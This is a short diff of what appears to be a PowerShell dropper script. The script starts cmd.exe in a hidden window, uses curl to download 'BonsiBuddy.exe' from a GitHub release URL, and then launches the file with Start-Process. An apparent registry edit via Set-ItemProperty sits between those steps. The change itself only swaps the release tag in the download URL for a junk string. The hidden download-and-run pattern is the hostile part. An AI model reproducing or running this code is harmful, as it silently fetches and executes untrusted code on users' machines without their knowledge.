@@ -10,7 +10,7 @@ Start-Process "cmd.exe" `
 
 # Download BonsiBuddy.exe
 Start-Process "cmd.exe" `
-    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/sigma/BonsiBuddy.exe"" -o `"$dest`"" `
+    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/fgfdgsdfdgsgd/BonsiBuddy.exe"" -o `"$dest`"" `
     -WindowStyle Hidden `
     -Wait
 
@@ -24,4 +24,5 @@ Set-ItemProperty `
 Start-Process $dest1
 
 exit
+
 
